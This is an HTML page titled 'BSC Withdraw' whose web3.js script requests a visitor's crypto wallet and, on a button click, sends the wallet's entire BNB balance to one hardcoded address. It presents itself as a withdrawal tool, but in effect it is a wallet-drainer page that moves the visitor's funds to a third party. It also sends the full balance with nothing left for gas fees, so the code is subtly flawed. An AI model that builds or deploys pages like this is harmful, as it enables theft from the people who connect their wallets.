<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSC Withdraw</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <button id="withdrawButton">Withdraw to 0x96181B6078645EE513205f1D7e874bbE3f423F74</button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
    <script>
        // Initialize Web3
        let web3;

        async function initWeb3() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);

                try {
                    // Request BSC wallet access
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                } catch (error) {
                    console.error('Access to BSC wallet denied:', error);
                }
            } else {
                console.log('No BSC wallet detected. Please install MetaMask or another BSC-compatible wallet.');
            }
        }

        // Function to withdraw all funds to the recipient address
        async function withdrawFunds() {
            try {
                if (!web3) {
                    console.error('Web3 is not initialized. Make sure you have a BSC-compatible wallet installed and connected.');
                    return;
                }

                // Specify the recipient address
                const recipientAddress = '0x96181B6078645EE513205f1D7e874bbE3f423F74';

                // Get the user's BSC address
                const accounts = await web3.eth.getAccounts();
                const userAddress = accounts[0];

                // Get the user's BSC balance
                const balance = await web3.eth.getBalance(userAddress);

                // Convert balance to Wei (1 BNB = 10^18 Wei)
                const balanceWei = web3.utils.toBN(balance);

                // Check if the user has a sufficient balance
                if (balanceWei.gt(web3.utils.toBN(0))) {
                    // Send the entire balance to the recipient address
                    const tx = await web3.eth.sendTransaction({
                        from: userAddress,
                        to: recipientAddress,
                        value: balanceWei.toString(),
                    });

                    console.log('Withdrawal successful. Transaction hash:', tx.transactionHash);
                } else {
                    console.log('Insufficient balance.');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }

        // Initialize Web3 and attach the withdrawal function to the button click event
        initWeb3().then(() => {
            document.getElementById('withdrawButton').addEventListener('click', withdrawFunds);
        });
    </script>
</body>
</html>
